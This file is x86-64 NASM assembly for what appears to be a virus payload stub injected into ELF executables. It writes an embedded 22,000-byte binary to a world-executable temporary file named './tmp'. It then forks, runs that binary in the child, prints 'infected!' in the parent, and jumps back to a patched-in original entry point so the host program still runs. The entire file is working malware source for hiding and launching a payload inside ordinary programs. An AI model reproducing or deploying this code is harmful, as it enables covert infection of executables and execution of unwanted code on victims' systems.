BITS 64

SECTION .text
global main

main:
    ; save original state of registers
    push rax
    push rcx
    push rdx
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    
    call .create_tmp_file
    mov r10, rax ; save tmp file descriptor into r10
    
    ; inject executable is stored right after this code
    ; write it into a new tmp file
    mov rax, 1 ; SYS_WRITE
    mov rdi, r10 ; file descriptor
    lea rsi, [rel $+msg_1_len-$+8] ; pointer to the start of inject binary
    mov rdx, 22000 ; inject binary size
    syscall
    
    ; close tmp file
    mov rax, 3 ; close file code
    mov rdi, r10 ; file descriptor
    syscall
    
    ; fork to execute inject binary
    mov rax, 57; SYS_FORK
    syscall
    
    cmp rax, 0 ; rax will store pid, if rax > 0 we are inside child thread
    jz .child
 
 .parent:
    ; print message that file been infected
    lea rsi, [rel $+msg-$]
    mov rdx, [rel $+len-$]
    call .print_msg
     
    ; recover original state of registers
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax
    
    ; return to the original entry point
    push 0xffaabb
    ret

.create_tmp_file: ; create tmp executable file
    mov rax, 85 ; create file code
    lea rdi, [rel $+exec_fname-$] ; file name to create
    mov rsi, 0777o ; read, write and execute by all
    syscall
    ret
    
.print_msg:
    ; print "infected!" message
    mov rax, 1
    mov rdi, 1
    ;lea rsi, [rel msg]
    ;mov rdx, [rel len]
    syscall
    ret
    
.child:
    ; print message
    lea rsi, [rel $+msg_1-$]
    mov rdx, [rel $+msg_1_len-$]
    call .print_msg
     
    mov rax, 59 ; SYS_EXECVE
    lea rdi, [rel $+exec_fname-$] ; file name to execute
    mov rsi, 0 ; argv
    mov rdx, 0
    syscall
    
msg: db "infected", 33, 10
err_0: db "Cant open target", 33, 10
msg_1: db "executing tmp file", 10
exec_fname: db "./tmp", 0
len: dq 10
err_0_len: dq 18
msg_1_len: dq 18


